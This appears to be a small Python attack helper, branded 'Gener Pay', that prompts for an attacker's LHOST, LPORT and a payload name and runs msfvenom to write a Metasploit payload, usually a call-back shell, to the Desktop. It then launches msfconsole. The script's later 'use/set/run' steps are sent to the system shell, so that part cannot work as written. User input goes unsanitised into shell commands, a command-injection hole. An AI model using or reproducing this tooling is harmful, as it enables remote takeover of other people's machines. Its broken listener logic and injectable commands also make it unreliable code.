import os
os.system("clear")
print ("""\033[1;31m
            ______                        ____
           / ____/__  ____  ___  _____   / __ \____ ___  __
          / / __/ _ \/ __ \/ _ \/ ___/  / /_/ / __ `/ / / /
         / /_/ /  __/ / / /  __/ /     / ____/ /_/ / /_/ /
         \____/\___/_/ /_/\___/_/     /_/    \__,_/\__, /
                                                  /____/
\033[1;32m                 The Tool By Bo Haydar El mo3alem
                   You must have Metasploit ...!
""")
username = os.getlogin()
print(username)
ip = str(input("\033[1;36mEnter LHOST ==> "))
portip = str(input("\033[1;33mEnter LPORT ==> "))
Noc = input("\033[1;32mEnter Your Pyload Name ==> ")
eXTEND = input("\033[1;31mEnter Your Payload Extend >>> ")

print("Your IP and Port { " + ip + ":" + portip + " }")

#msfvenom -p .... LHOST=IP LPORT=portip -o /home/username/Desktop/payload......
os.system("msfvenom -p " + Noc +" LHOST=" + ip + " LPORT=" + portip + " -o /home/" + username + "/Desktop/payload." + eXTEND)
# print("msfvenom -p " + Noc +" LHOST=" + ip + " LPORT=" + portip + " -o /home/" + username + "/Desktop/payload." + eXTEND)

os.system("msfconsole")
os.system("use " + Noc)
os.system("set LHOST " + ip)
os.system("set LPORT " + portip)
os.system("set payload " + Noc)
os.system("run")
